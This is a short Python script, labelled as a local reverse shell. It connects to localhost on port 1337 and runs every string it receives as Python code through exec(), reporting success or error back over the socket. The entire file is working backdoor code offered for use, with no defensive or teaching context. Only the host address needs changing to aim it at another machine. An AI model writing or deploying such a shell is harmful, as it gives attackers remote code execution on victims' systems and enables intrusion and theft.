# make a local host reverse python shell
import socket, subprocess, os, sys, time

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("localhost", 1337))
    while True:
        command = s.recv(1024)
        if "terminate" in command.decode():
            s.send("Connection Terminated.".encode())
            s.close()
            break
        else:
            try:
                exec(command.decode())
                s.send("Command executed successfully.".encode())
            except Exception as e:
                s.send("Command executed with error(s).".encode())

if __name__ == "__main__":
    connect()